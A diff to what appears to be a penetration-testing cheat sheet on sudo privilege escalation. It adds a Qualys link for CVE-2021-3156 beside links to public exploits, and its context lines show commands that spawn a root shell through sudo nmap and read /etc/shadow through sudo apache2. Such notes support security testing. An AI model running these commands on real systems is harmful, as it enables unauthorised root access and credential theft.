@@ -95,7 +95,10 @@ sudo su root, type password, see ******: passwd feedback enabled
 
 [proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634)  
 ## CVE-2021-3156 - Baron Samedit 
+[Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)  
 [proof of concept](https://github.com/stong/CVE-2021-3156)  
+
+
 ## Misc sudo binaries  
     echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
     sudo apache2 -f /etc/shadow
